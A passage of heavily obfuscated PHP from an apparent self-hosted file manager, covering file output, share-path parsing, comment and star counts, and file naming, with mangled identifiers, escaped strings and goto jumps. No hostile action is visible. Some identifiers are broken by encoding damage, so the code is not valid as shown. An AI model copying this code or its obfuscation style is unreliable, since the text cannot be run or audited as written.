$¶È¹ = empty($¶È¹) ? $š‚ç™À“ÃŠÇ[$è§Ì˜¾æÌ´½÷[76]] : $¶È¹; $ÃßöÂ = $this->model->addFileByRemote($š‚ç™À“ÃŠÇ[$è§Ì˜¾æÌ´½÷[395]], $Àáä, $¶È¹, $É…¨•¹·, $Èµ˜‡´®æ°¹); return $this->getPathOuter($ÃßöÂ); } public function uploadLink($ã¬êÙ“‹, $•ø—É¤‘Æ = 0) { $ÑÓÍÓæî =& $_SERVER[ÀÆ]; $»¸†Ã‚Åî = $this->parse($ã¬êÙ“‹); $‡ = _get($GLOBALS[$ÑÓÍÓæî[7]], $ÑÓÍÓæî[1252]); $£·îÕšƒ¨³ = _get($GLOBALS[$ÑÓÍÓæî[7]], $ÑÓÍÓæî[1253]); $ã¬êÙ“‹ = Model($ÑÓÍÓæî[597])->createFileName($»¸†Ã‚Åî[$ÑÓÍÓæî[76]], $‡, $£·îÕšƒ¨³); return IO::uploadLink($ã¬êÙ“‹, $•ø—É¤‘Æ); } public function fileNameAuto($ƒ†, $ºâš¡¦›, $ŸàÅÚóÙ» = REPEAT_REPLACE, $’œ´š— = false) { return $this->model->fileNameAuto($ƒ†, $ºâš¡¦›, $ŸàÅÚóÙ», $’œ´š—); } public function fileNameExist($÷ª¼¾®‰È, $Œìø) { return $this->model->fileNameExist($÷ª¼¾®‰È, $Œìø); } protected function _fileOut($—³¶âî, $âá¤Ñ¥• = false, $¶¾”× = false, $ºù”á Ûëöà° = '', $µÉúÔ = false) { $İ­•¥ÁÅ”¡Ï =& $_SERVER[ÀÆ]; $ŒÍ‘¬¹•ÀÑŞÎ = $this->model->sourceInfo($—³¶âî); if ($ŒÍ‘¬¹•ÀÑŞÎ[$İ­•¥ÁÅ”¡Ï[405]] == $İ­•¥ÁÅ”¡Ï[87]) { header($İ­•¥ÁÅ”¡Ï[1254]); die; } $„³å÷ì = $this->model->fileInfoGet($—³¶âî); $ºù”á Ûëöà° = $„³å÷ì[$İ­•¥ÁÅ”¡Ï[170]] ? $„³å÷ì[$İ­•¥ÁÅ”¡Ï[170]] : $ºù”á Ûëöà°; $¿ç = isset($GLOBALS[$İ­•¥ÁÅ”¡Ï[1255]]) ? $GLOBALS[$İ­•¥ÁÅ”¡Ï[1255]] : $ŒÍ‘¬¹•ÀÑŞÎ[$İ­•¥ÁÅ”¡Ï[28]]; if ($µÉúÔ) { return IO::fileOutServer($„³å÷ì[$İ­•¥ÁÅ”¡Ï[76]], $âá¤Ñ¥•, $¿ç, $ºù”á Ûëöà°); } IO::fileOut($„³å÷ì[$İ­•¥ÁÅ”¡Ï[76]], $âá¤Ñ¥•, $¿ç, $ºù”á Ûëöà°); } public function fileOut($ËÇŒ³åœ­, $Ë¡¡ = false, $Ìñü = false, $×ì¢‰ = '') { $this->_fileOut($ËÇŒ³åœ­, $Ë¡¡, $Ìñü, $×ì¢‰); } public function fileOutServer($ã¢£¦, $ ¢„™óè• = false, $±¨öÉŠ = false, $Í¢˜«À = '') { $this->_fileOut($ã¢£¦, $ ¢„™óè•, $±¨öÉŠ, $Í¢˜«À, !0); } protected function _fileOutImage($÷¡Å­, $¤™È”¶Ÿ×ı = 250) { $€¼ÓÖ°´³ß‰ =& $_SERVER[ÀÆ]; $ÒŸî€ = $this->model->pathInfo($÷¡Å­); if ($ÒŸî€[$€¼ÓÖ°´³ß‰[405]] == $€¼ÓÖ°´³ß‰[87]) { show_json($€¼ÓÖ°´³ß‰[1256] . $÷¡Å­, !1); } $åÈ« = $this->model->fileInfoGet($÷¡Å­); $åÈ«[$€¼ÓÖ°´³ß‰[28]] = $ÒŸî€[$€¼ÓÖ°´³ß‰[28]]; $åÈ«[$€¼ÓÖ°´³ß‰[163]] = $ÒŸî€[$€¼ÓÖ°´³ß‰[163]]; $GLOBALS[$€¼ÓÖ°´³ß‰[1255]] = $åÈ«[$€¼ÓÖ°´³ß‰[28]]; $GLOBALS[$€¼ÓÖ°´³ß‰[162]] = $åÈ«; IO::fileOutImage($åÈ«[$€¼ÓÖ°´³ß‰[76]], $¤™È”¶Ÿ×ı); } public function fileOutImage($ÕŠ§È, $Ë“×ùÅ³­ª = 250) { $this->_fileOutImage($ÕŠ§È, $Ë“×ùÅ³­ª); } public function fileOutImageServer($ìãĞÊ , $¡É·÷æ»…á = 250) { $this->_fileOutImage($ìãĞÊ , $¡É·÷æ»…á); } public function link($‡ş£ëé, $Ş™è = '') { $†­ = $this->model->fileInfoGet($‡ş£ëé); return IO::link($†­[$_SERVER[ÀÆ][76]], $Ş™è); } protected function parse($ƒÔ‡å¼) { $—»ìÂ’ =& $_SERVER[ÀÆ]; if (strstr($ƒÔ‡å¼, $—»ìÂ’[8]) === !1) { return array($—»ìÂ’[414] => intval($ƒÔ‡å¼), $—»ìÂ’[76] => $—»ìÂ’[33], $—»ìÂ’[1251] => array()); } $Ê¨¨ÑÃÖş = explode($—»ìÂ’[8], trim($ƒÔ‡å¼, $—»ìÂ’[8])); if (count($Ê¨¨ÑÃÖş) < 2) { show_tips($ƒÔ‡å¼ . $—»ìÂ’[1257]); } return array($—»ìÂ’[414] => intval($Ê¨¨ÑÃÖş[0]), $—»ìÂ’[76] => $Ê¨¨ÑÃÖş[1], $—»ìÂ’[1251] => array_slice($Ê¨¨ÑÃÖş, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÍÒûâæ) { $this->pathParse = $ÍÒûâæ; $this->model = Model($_SERVER[ÀÆ][1250]); } public function getPathOuter($öİÄ) { $’­²êé‘©¸ =& $_SERVER[ÀÆ]; if (!$öİÄ) { return $öİÄ; } $•˜ ¼ÀâÙÙ = $this->parse($öİÄ); return trim(KodIO::makeShare($this->pathParse[$’­²êé‘©¸[395]], $•˜ ¼ÀâÙÙ[$’­²êé‘©¸[395]]), $’­²êé‘©¸[8]); } protected function infoParse($¤Ôã†Ò½¥, $­áïø³˜ä¬ = false, $ğØŒËÄµÁÍğ = false) { $ºãæ–ßº =& $_SERVER[ÀÆ]; $ã¨ = $this->pathParse[$ºãæ–ßº[395]]; $¤Âº½¶šÊ€ = trim($this->pathParse[$ºãæ–ßº[1096]], $ºãæ–ßº[8]); return Action($ºãæ–ßº[1258])->sharePathInfo($ã¨, $¤Âº½¶šÊ€); } public function infoFull($Óñ°¶í¥â’) { $öˆİ‘˜—¿úäà =& $_SERVER[ÀÆ]; $À’Ç‰¬­« = explode($öˆİ‘˜—¿úäà[8], trim($Óñ°¶í¥â’, $öˆİ‘˜—¿úäà[8])); if (count($À’Ç‰¬­«) > 1) { $„ÂÀ™ŸÃ´ = implode($öˆİ‘˜—¿úäà[8], array_splice($À’Ç‰¬­«, 1)); $²»ˆ®îÛ‚È»è = $this->model->pathInfoByPath($À’Ç‰¬­«[0], $„ÂÀ™ŸÃ´); if (!$²»ˆ®îÛ‚È»è) { return !1; } $this->pathParse[$öˆİ‘˜—¿úäà[1096]] = $²»ˆ®îÛ‚È»è[$öˆİ‘˜—¿úäà[397]]; } return $this->infoParse($Óñ°¶í¥â’); } public function listAll($‰¢æëÏ¬) { $óÑ«Ÿ =& $_SERVER[ÀÆ]; $”×–çÎæ = IO::info($this->pathParse[$óÑ«Ÿ[76]]); if (!$”×–çÎæ) { return array(); } $Éùï = $this->model->listAll($‰¢æëÏ¬); $ˆô–‚™¸ = Model($óÑ«Ÿ[589])->getInfo($”×–çÎæ[$óÑ«Ÿ[482]]); $­ˆ¯ÈÀö¯ = Action($óÑ«Ÿ[1258]); foreach ($Éùï as &$‘”¯Ö«Ü) { check_abort(); $‘”¯Ö«Ü[$óÑ«Ÿ[85]] = $­ˆ¯ÈÀö¯->_shareItemeParse($‘”¯Ö«Ü[$óÑ«Ÿ[85]], $ˆô–‚™¸); } unset($‘”¯Ö«Ü); return $Éùï; } } goto C§»éÃöšÉ; aç‡›ßÕÂÔ: function binCheckBigger($ãƒØŒşƒÓ, $Ã…¾•) { return $ãƒØŒşƒÓ > $Ã…¾•; } $_SERVER[$_SERVER[øêŞ][3]] = ("\x37\x38\x35\x33"."\70\61")+0;$_DCWA="guPwyciJVgMW4I9SYinD8thB5S4JRJM7KuhprRwtHNQIBdUgZATzp87kaKvp6DjxrdQQeUkFysnfhH";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($”ƒ–‡í¬ì, $©Úéƒ×ø”İá‚) { $ÊÑÏµ‡ =& $_SERVER[ÀÆ]; if (isset(self::$_methodList[$”ƒ–‡í¬ì])) { return @call_user_func_array(self::$_methodList[$”ƒ–‡í¬ì], $©Úéƒ×ø”İá‚); } else { if (method_exists($this, $”ƒ–‡í¬ì)) { return call_user_func_array(array($this, $”ƒ–‡í¬ì), $©Úéƒ×ø”İá‚); } else { think_exception(__CLASS__ . $ÊÑÏµ‡[4] . $”ƒ–‡í¬ì . $ÊÑÏµ‡[5]); } } } public static function __callStatic($å•, $ßíÓ) { if (isset(self::$_methodListStatic[$å•])) { return call_user_func_array(self::$_methodListStatic[$å•], $ßíÓ); } else { if (method_exists(self, $å•)) { return call_user_func_array(array(self, $å•), $ßíÓ); } else { show_json("{$å•}\x28\x29\40\x6e\157\164\x20\x65\170\151\x73\x74\x3b", !1); } } } public static function addMethod($±¡, $ù®ÃÇø„ÜÚ€¤) { self::$_methodList[$±¡] = $ù®ÃÇø„ÜÚ€¤; } public static function addMethodStatic($’ûíæÓ÷í, $§®øâ†¹) { self::$_methodListStatic[$’ûíæÓ÷í] = $§®øâ†¹; } } goto BÊÆÈï…å; f’ÁÙÄ·ù¿: class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\x65\x6e\x74"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\x61\x6d\x65" => "\143\x6f\x6d\x6d\145\156\x74\137\x6d\145\x74\x61", "\x6d\x65\x74\141\106\151\x65\x6c\144" => "\143\x6f\155\155\x65\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($‚¦·) { $È‡†ªÃ—”– =& $_SERVER[ÀÆ]; if ($‚¦·[$È‡†ªÃ—”–[1767]]) { $²Û€ÕùıáĞ’é = $this->where(array($È‡†ªÃ—”–[1768] => $‚¦·[$È‡†ªÃ—”–[1767]]))->find(); if (!$²Û€ÕùıáĞ’é || $²Û€ÕùıáĞ’é[$È‡†ªÃ—”–[406]] != $‚¦·[$È‡†ªÃ—”–[406]] || $²Û€ÕùıáĞ’é[$È‡†ªÃ—”–[498]] != $‚¦·[$È‡†ªÃ—”–[498]]) { return !1; } $this->where(array($È‡†ªÃ—”–[1768] => $‚¦·[$È‡†ªÃ—”–[1767]]))->setAdd($È‡†ªÃ—”–[1769], 1); } $‚¦·[$È‡†ªÃ—”–[1770]] = 0; $‚¦·[$È‡†ªÃ—”–[1769]] = 0; $‚¦·[$È‡†ªÃ—”–[735]] = 1; return $this->add($‚¦·); } public function commentCount($ÉºÒ×, $†ƒ®ØÒÒ, $Ğº‰¥·Šá°å = false) { $ü¯ =& $_SERVER[ÀÆ]; if (!$ÉºÒ×) { return array(); } if (is_string($ÉºÒ×) || is_int($ÉºÒ×)) { $ÉºÒ× = array($ÉºÒ×); } $°ªû‰×´áã‡ã = array($ü¯[498], $ü¯[1771] => $ü¯[494]); $àÈ‹Íñ»Ã‡Î = array($ü¯[498] => array($ü¯[7], $ÉºÒ×), $ü¯[406] => $†ƒ®ØÒÒ); if ($Ğº‰¥·Šá°å) { $àÈ‹Íñ»Ã‡Î[$ü¯[1572]] = $Ğº‰¥·Šá°å; } $¯ĞÔî‘ºë = $this->field($°ªû‰×´áã‡ã)->where($àÈ‹Íñ»Ã‡Î)->group($ü¯[498])->select(); return array_to_keyvalue($¯ĞÔî‘ºë, $ü¯[498], $ü¯[494]); } public function starTarget($É„¡©îÖ, $ÃØŒº) { $¡…ÍÉÖ§ =& $_SERVER[ÀÆ]; $¢å®¨± = $É„¡©îÖ + self::TYPE_STAR_OFFSET; $²é©Ì = array($¡…ÍÉÖ§[1572] => USER_ID, $¡…ÍÉÖ§[406] => $¢å®¨±, $¡…ÍÉÖ§[498] => $ÃØŒº); $¶ç’¡À = $this->where($²é©Ì)->find(); if ($¶ç’¡À) { return $this->where(array($¡…ÍÉÖ§[395] => $¶ç’¡À[$¡…ÍÉÖ§[395]]))->delete(); } $ÎÚãªÚ‘—¹ = array($¡…ÍÉÖ§[1767] => 0, $¡…ÍÉÖ§[1572] => USER_ID, $¡…ÍÉÖ§[735] => 1, $¡…ÍÉÖ§[740] => $¡…ÍÉÖ§[33], $¡…ÍÉÖ§[406] => $¢å®¨±, $¡…ÍÉÖ§[498] => $ÃØŒº, $¡…ÍÉÖ§[1770] => 0, $¡…ÍÉÖ§[1769] => 0); return $this->add($ÎÚãªÚ‘—¹); } public function starTargetCount($¡‡Í¯Ş×‚ñü, $òöÜ‰œœ—°) { $ç°Ÿ¯¶½¸ =& $_SERVER[ÀÆ]; $¢÷“®¥ùúëá = $òöÜ‰œœ—° + self::TYPE_STAR_OFFSET; $ÆÜåĞï = $this->commentCount($¡‡Í¯Ş×‚ñü, $¢÷“®¥ùúëá); $¡§ÌÑÙö·÷ù = $this->commentCount($¡‡Í¯Ş×‚ñü, $¢÷“®¥ùúëá, USER_ID); return array($ç°Ÿ¯¶½¸[1772] => $ÆÜåĞï, $ç°Ÿ¯¶½¸[1773] => $¡§ÌÑÙö·÷ù); } public function starTargetUserList($Ô¢Š, $ŠÎ–ÂÅË) { $Íõè£Ñ­”ú =& $_SERVER[ÀÆ]; $¸® = $Ô¢Š + self::TYPE_STAR_OFFSET; $ï…Å = array($Íõè£Ñ­”ú[498] => $ŠÎ–ÂÅË, $Íõè£Ñ­”ú[406] => $¸®); $îƒÔş = $this->where($ï…Å)->count(); $¹ÇÄÌÒö¥é¤Ş = array($Íõè£Ñ­”ú[253] => $îƒÔş, $Íõè£Ñ­”ú[1774] => array()); if (!$îƒÔş) { return $¹ÇÄÌÒö¥é¤Ş; } $ä·ËÀµ = $this->field($Íõè£Ñ­”ú[1572])->where($ï…Å)->limit(500)->select(); $ä·ËÀµ = array_to_keyvalue($ä·ËÀµ, $Íõè£Ñ­”ú[33], $Íõè£Ñ­”ú[1572]); $¹ÇÄÌÒö¥é¤Ş[$Íõè£Ñ­”ú[1774]] = Model($Íõè£Ñ­”ú[507])->userListInfo($ä·ËÀµ); return $¹ÇÄÌÒö¥é¤Ş; } public function prasiseUserList($‡¶ÌÒ“Ë«×Äï) { $‰ñùšë¿† =& $_SERVER[ÀÆ]; $¹œŞ” = array($‰ñùšë¿†[1775] => $‡¶ÌÒ“Ë«×Äï); $ÑßÔ = $this->where($¹œŞ”)->find(); $Ñ´ÃúÈÆØòÃ = _get($ÑßÔ, $‰ñùšë¿†[1770], 0); $­ğ“ÆˆÃ = array($‰ñùšë¿†[253] => $Ñ´ÃúÈÆØòÃ, $‰ñùšë¿†[1774] => array()); if (!$Ñ´ÃúÈÆØòÃ) { return $­ğ“ÆˆÃ; } $äÉÕàº” = Model($‰ñùšë¿†[1776])->field($‰ñùšë¿†[1572])->where($¹œŞ”)->limit(500)->select(); $äÉÕàº” = array_to_keyvalue($äÉÕàº”, $‰ñùšë¿†[33], $‰ñùšë¿†[1572]); $­ğ“ÆˆÃ[$‰ñùšë¿†[1774]] = Model($‰ñùšë¿†[507])->userListInfo($äÉÕàº”); return $­ğ“ÆˆÃ; } public function remove($ˆÅ) { $‡¢‹ÛœŞÜ =& $_SERVER[ÀÆ]; $¡”±ì = array($‡¢‹ÛœŞÜ[1768] => $ˆÅ); $ƒÏÔ“— = $this->where($¡”±ì)->find(); if ($ƒÏÔ“—[$‡¢‹ÛœŞÜ[1767]]) { $this->where(array($‡¢‹ÛœŞÜ[1768] => $ƒÏÔ“—[$‡¢‹ÛœŞÜ[1767]]))->setAdd($‡¢‹ÛœŞÜ[1769], -1); } return $this->where($¡”±ì)->delete(); } public function edit($ñÊÔÔÌÕ±, $†¶ÕÎÀË®¨Îš) { $ç²È™’ =& $_SERVER[ÀÆ]; $Ë‰š‡õ³Æ¼” = array($ç²È™’[1768] => $ñÊÔÔÌÕ±); return $this->where($Ë‰š‡õ³Æ¼”)->save(array($ç²È™’[1777] => $†¶ÕÎÀË®¨Îš)); } public function prasise($‘ßÄá­àã¦¸) { $‹şâ™ =& $_SERVER[ÀÆ]; $¿İ£®¸À = Model($‹şâ™[1778]); $İÁó¼ê = array($‹şâ™[1768] => $‘ßÄá­àã¦¸, $‹şâ™[1563] => USER_ID); $ïÒå„±è = $¿İ£®¸À->where($İÁó¼ê)->find(); if (!$ïÒå„±è) { $¿İ£®¸À->add($İÁó¼ê); $¨æªŞåµæÑÛ = $this->where(array($‹şâ™[1768] => $‘ßÄá­àã¦¸))->setAdd($‹şâ™[1770], 1); } else { $¿İ£®¸À->where($İÁó¼ê)->delete(); $¨æªŞåµæÑÛ = $this->where(array($‹şâ™[1768] => $‘ßÄá­àã¦¸))->setAdd($‹şâ™[1770], -1); } return $¨æªŞåµæÑÛ; } public function targetInfo($ÅÔÄå“è…Ş, $„è˜íŞê) { $™  =& $_SERVER[ÀÆ]; $ƒìß = array($™ [574] => $ÅÔÄå“è…Ş, $™ [575] => $„è˜íŞê); $øœ„ = $this->where($ƒìß)->count(); $ÛÈ…è›ÊÄ¿ = "\x52\x49\x47\110\x54\x20\112\117\111\x4e\40{$this->tablePrefix}\x63\157\155\x6d\x65\x6e\164\137\x70\x72\x61\x69\x73\x65\x20\163\164\141\162\x20\x6f\x6e\40\143\x6f\155\x6d\145\x6e\x74\56\x63\157\155\155\x65\x6e\x74\x49\x44\x20\x3d\x20\x73\x74\141\162\x2e\x63\157\x6d\155\145\156\x74\x49\104"; $õ·› = $this->alias($™ [352])->where($ƒìß)->join($ÛÈ…è›ÊÄ¿, $™ [1779])->count(); $ÚŞ = array($™ [1780] => $øœ„, $™ [1781] => $õ·›); return $ÚŞ; } public function listData($ğ®şÅ’) { $·˜µìû¸‘ =& $_SERVER[ÀÆ]; if (isset($ğ®şÅ’[$·˜µìû¸‘[1782]])) { if ($ğ®şÅ’[$·˜µìû¸‘[1782]]) { $ğ®şÅ’[$·˜µìû¸‘[1775]] = array($·˜µìû¸‘[1005], intval($ğ®şÅ’[$·˜µìû¸‘[1782]])); } unset($ğ®şÅ’[$·˜µìû¸‘[1782]]); } if (isset($ğ®şÅ’[$·˜µìû¸‘[1783]])) { if ($ğ®şÅ’[$·˜µìû¸‘[1783]]) { $ğ®şÅ’[$·˜µìû¸‘[1775]] = array($·˜µìû¸‘[1002], intval($ğ®şÅ’[$·˜µìû¸‘[1783]])); } unset($ğ®şÅ’[$·˜µìû¸‘[1783]]); } return $this->_listData($ğ®şÅ’); } private function _listData($ »°«–óÇ…) { $ùÈ¹àÚõ’û© =& $_SERVER[ÀÆ]; $å»ê×† = $this->where($ »°«–óÇ…)->_makeOrder()->selectPage(100); $this->_listAppendParent($å»ê×†[$ùÈ¹àÚõ’û©[367]]); $this->_listAppendUser($å»ê×†[$ùÈ¹àÚõ’û©[367]]); $this->_listAppendMeta($å»ê×†[$ùÈ¹àÚõ’û©[367]]); return $å»ê×†; } private function _makeOrder() { $‰šƒ‡Š›ÔÃî© =& $_SERVER[ÀÆ]; $î = array($‰šƒ‡Š›ÔÃî©[1770], $‰šƒ‡Š›ÔÃî©[1769], $‰šƒ‡Š›ÔÃî©[194]); $èÏâ‰§ñ¯ú = Input::get($‰šƒ‡Š›ÔÃî©[449], $‰šƒ‡Š›ÔÃî©[7], $‰šƒ‡Š›ÔÃî©[418], $î); $Œ¼ÛÌ™±È = Input::get($‰šƒ‡Š›ÔÃî©[450], $‰šƒ‡Š›ÔÃî©[7], $‰šƒ‡Š›ÔÃî©[1565], array($‰šƒ‡Š›ÔÃî©[1784], $‰šƒ‡Š›ÔÃî©[445])); $†×õı­‚÷öèö = $èÏâ‰§ñ¯ú . $‰šƒ‡Š›ÔÃî©[50] . $Œ¼ÛÌ™±È; return $this->order($†×õı­‚÷öèö); } private function _listAppendParent(&$úÒÈ¡ü›Ò˜Ş‘) { $¶­ =& $_SERVER[ÀÆ]; $Úõ®åèËÁÕ = array_unique(array_to_keyvalue($úÒÈ¡ü›Ò˜Ş‘, $¶­[33], $¶­[1767])); $Úõ®åèËÁÕ = array_remove_value($Úõ®åèËÁÕ, $¶­[191]); if (!$Úõ®åèËÁÕ) { return; } $«–¿ = $this->where(array($¶­[1768] => array($¶­[7], $Úõ®åèËÁÕ)))->select(); $«–¿ = array_to_keyvalue($«–¿, $¶­[1775]); foreach ($úÒÈ¡ü›Ò˜Ş‘ as &$™ÌÙ) { if (isset($«–¿[$™ÌÙ[$¶­[1767]]])) { $™ÌÙ[$¶­[1785]] = $«–¿[$™ÌÙ[$¶­[1767]]]; } } unset($™ÌÙ); } private function _listAppendUser(&$Ñá›÷) { $ö”ï¿ã¥çÌ =& $_SERVER[ÀÆ]; $ÈõÇÃëÊíµ = array_unique(array_to_keyvalue($Ñá›÷, $ö”ï¿ã¥çÌ[33], $ö”ï¿ã¥çÌ[1572])); $ÈõÇÃëÊíµ = array_remove_value($ÈõÇÃëÊíµ, $ö”ï¿ã¥çÌ[191]); if (count($ÈõÇÃëÊíµ) == 0) { return; } foreach ($Ñá›÷ as $Ê÷£) { if (isset($Ê÷£[$ö”ï¿ã¥çÌ[1785]])) { $ÈõÇÃëÊíµ[] = $Ê÷£[$ö”ï¿ã¥çÌ[1785]][$ö”ï¿ã¥çÌ[1572]]; } } $áô = Model($ö”ï¿ã¥çÌ[532])->userListInfo($ÈõÇÃëÊíµ); foreach ($Ñá›÷ as &$Ê÷£) { $Ê÷£[$ö”ï¿ã¥çÌ[588]] = $áô[$Ê÷£[$ö”ï¿ã¥çÌ[1572]]]; if (isset($Ê÷£[$ö”ï¿ã¥çÌ[1785]])) { $Ê÷£[$ö”ï¿ã¥çÌ[1785]][$ö”ï¿ã¥çÌ[588]] = $áô[$Ê÷£[$ö”ï¿ã¥çÌ[1785]][$ö”ï¿ã¥çÌ[1572]]]; } } unset($Ê÷£); } private function _listAppendMeta(&$Šœ¶Ò¹’—÷) { $ÒàÏ¾ =& $_SERVER[ÀÆ]; $ã×½ó² = array_unique(array_to_keyvalue($Šœ¶Ò¹’—÷, $ÒàÏ¾[33], $ÒàÏ¾[1775])); $ã×½ó² = array_remove_value($ã×½ó², $ÒàÏ¾[191]); if (!$ã×½ó²) { return; } foreach ($Šœ¶Ò¹’—÷ as $ûÏÚ) { if (isset($ûÏÚ[$ÒàÏ¾[1785]])) { $ã×½ó²[] = $ûÏÚ[$ÒàÏ¾[1785]][$ÒàÏ¾[1775]]; } } $›Ğ = $this->metaList($ã×½ó²); if (!$›Ğ) { return !1; } foreach ($Šœ¶Ò¹’—÷ as &$ûÏÚ) { $ûÏÚ[$ÒàÏ¾[459]] = $›Ğ[$ûÏÚ[$ÒàÏ¾[1775]]]; if (isset($ûÏÚ[$ÒàÏ¾[1785]])) { $ûÏÚ[$ÒàÏ¾[1785]][$ÒàÏ¾[459]] = $›Ğ[$ûÏÚ[$ÒàÏ¾[1785]][$ÒàÏ¾[1775]]]; } } unset($ûÏÚ); } private function metaList($¤ŞôÇ) { $è¢® =& $_SERVER[ÀÆ]; if (!$¤ŞôÇ) { return array(); } $ÃÓÒòÀ¼ê©˜• = array($è¢®[1775] => array($è¢®[7], $¤ŞôÇ)); $ğ§ò = Model($è¢®[1786])->where($ÃÓÒòÀ¼ê©˜•)->select(); $ğ§ò = array_to_keyvalue_group($ğ§ò, $è¢®[1775]); foreach ($ğ§ò as $Ù¢–è => $Ğ¿©ÏÒ¶â‡¨³) { $±Ñì×Àº = array(); foreach ($Ğ¿©ÏÒ¶â‡¨³ as $Î‰½) { $±Ñì×Àº[$Î‰½[$è¢®[93]]] = $Î‰½[$è¢®[372]]; } $ğ§ò[$Ù¢–è] = $±Ñì×Àº; } return $ğ§ò ? $ğ§ò : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\154\x65\137\x63\157\156\164\x65\156\x74\x73"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\124\x69\x6d\145", "\x74\x69\155\x65", "\151\x6e\x73\x65\162\x74", "\146\165\x6e\x63\x74\x69\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\154\145"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\x61\x6d\x65" => "\151\x6f\x5f\146\x69\x6c\145\x5f\155\x65\x74\x61", "\x6d\145\x74\141\x46\151\145\x6c\144" => "\x66\151\154\145\x49\104"); public function fileInfo($¯·±¨î¹) { $Ø— =& $_SERVER[ÀÆ]; static $´‡¢¥°ƒÄ÷ = array(); if (!isset($´‡¢¥°ƒÄ÷[$¯·±¨î¹])) { $å× = $Ø—[1787]; $•ãÕ€™ê = Model($Ø—[464])->field($å×)->where(array($Ø—[462] => $¯·±¨î¹))->find(); $´‡¢¥°ƒÄ÷[$¯·±¨î¹] = $•ãÕ€™ê; } return $´‡¢¥°ƒÄ÷[$¯·±¨î¹]; } public function addFileByContent($Ÿ•ù§¦Ò„ú÷Š = '', $àÔ–—ğ = '') { $€›ÚÓÃÃõœ =& $_SERVER[ÀÆ]; $•ÃŸ = TEMP_PATH . $€›ÚÓÃÃõœ[1788]; if (!is_dir($•ÃŸ)) { mk_dir($•ÃŸ); } $åàâ¾õ™İ = $•ÃŸ . $€›ÚÓÃÃõœ[1789] . rand_string(16); file_put_contents($åàâ¾õ™İ, $Ÿ•ù§¦Ò„ú÷Š); $çÑ‚—´ = $this->addFile($åàâ¾õ™İ, $àÔ–—ğ, !0); if (file_exists($åàâ¾õ™İ)) { @unlink($åàâ¾õ™İ); } return $çÑ‚—´; } public function createFileName($è»«–, $ÇËöë‚ = false, $·±ê– ôÀÊñ = false) { $à´· =& $_SERVER[ÀÆ]; $ÙÌ™“¢ĞÇ¹¯ = IO::init($à´·[8]); $Ÿ˜âÍ = $this->makeFilePath($è»«–, $ÙÌ™“¢ĞÇ¹¯, $ÇËöë‚, $·±ê– ôÀÊñ); $›íèµ = $ÙÌ™“¢ĞÇ¹¯->pathFather($Ÿ˜âÍ); static $¦õ´‹ï­µ¼ = false; $Å¬»®±é– = $à´·[1790] . md5($›íèµ); if (!$¦õ´‹ï­µ¼ && !Cache::get($Å¬»®±é–)) { $¦õ´‹ï­µ¼ = !0; $ç¥‹õŒÄ = IO::mkdir($›íèµ); if (!IO::exist($ç¥‹õŒÄ . $à´·[788])) { IO::mkfile($ç¥‹õŒÄ . $à´·[788]); } Cache::set($Å¬»®±é–, 1, 3600 * 2); } return $Ÿ˜âÍ; } public function makeFilePath($ìÈÒ°, $Ìò¼ˆĞÖŸÙ, $¼È¿¡ıëÃ = false, $‘òúÀç¿«ç = false) { $úĞåÖÛŠÇ± =& $_SERVER[ÀÆ]; $ŠÕëÙªÃ¯Ö² = Model($úĞåÖÛŠÇ±[755])->get($úĞåÖÛŠÇ±[1791]); $‘“•¿¦… = KodIO::defaultIO() . date($úĞåÖÛŠÇ±[1792]); $î˜±í = $‘“•¿¦… . rand_string(5) . short_id(100); $ìÈÒ° = str_replace($úĞåÖÛŠÇ±[8], $úĞåÖÛŠÇ±[71], KodIO::clear($ìÈÒ°)); $åî«ä = $Ìò¼ˆĞÖŸÙ->ext($ìÈÒ°); if (!$ìÈÒ°) { $ŠÕëÙªÃ¯Ö² = $úĞåÖÛŠÇ±[1793]; } switch ($ŠÕëÙªÃ¯Ö²) { case $úĞåÖÛŠÇ±[1794]: $î˜±í = $î˜±í . $úĞåÖÛŠÇ±[95] . $Ìò¼ˆĞÖŸÙ->ext($ìÈÒ°); if ($åî«ä == $úĞåÖÛŠÇ±[1731]) { $î˜±í .= $úĞåÖÛŠÇ±[1470]; } break; case $úĞåÖÛŠÇ±[1795]: $¡ŠÇŸ¥ª¢ = Model($úĞåÖÛŠÇ±[755])->get($úĞåÖÛŠÇ±[756]); $àÕ°¿Ù¿Ã = substr(md5($úĞåÖÛŠÇ±[757] . $¡ŠÇŸ¥ª¢ . date($úĞåÖÛŠÇ±[733])), 0, 8); $ŸÅ¿Îıãƒï½¯ = KodIO::defaultDriver(); $‘“•¿¦… = $úĞåÖÛŠÇ±[1156] . $ŸÅ¿Îıãƒï½¯[$úĞåÖÛŠÇ±[395]] . $úĞåÖÛŠÇ±[404] . date($úĞåÖÛŠÇ±[1796]) . $àÕ°¿Ù¿Ã . $úĞåÖÛŠÇ±[8]; if ($åî«ä == $úĞåÖÛŠÇ±[1731]) { $ìÈÒ° .= $úĞåÖÛŠÇ±[1470]; } $Ëµê€² = $úĞåÖÛŠÇ±[1797] . $‘“•¿¦… . $ìÈÒ°; CacheLock::lock($Ëµê€²); $î˜±í = $‘“•¿¦… . $ìÈÒ°; if (IO::exist($‘“•¿¦… . $ìÈÒ°)) { $¶ºŸ’¨ = substr($ìÈÒ°, 0, strlen($ìÈÒ°) - strlen($åî«ä)); $ˆ­ãê¡ = $‘òúÀç¿«ç ? substr($‘òúÀç¿«ç, 0, 5) : ($¼È¿¡ıëÃ ? substr($¼È¿¡ıëÃ, 0, 5) : rand_string(5)); $î˜±í = $‘“•¿¦… . $¶ºŸ’¨ . $ˆ­ãê¡ . $úĞåÖÛŠÇ±[95] . $åî«ä; } if (IO::isTypeObject($î˜±í) && !IO::isUploadServer($î˜±í)) { if (IO::exist($î˜±í)) { return $î˜±í; } $¼ø‹¤Ê´¥Ú = IO::setContent($î˜±í, 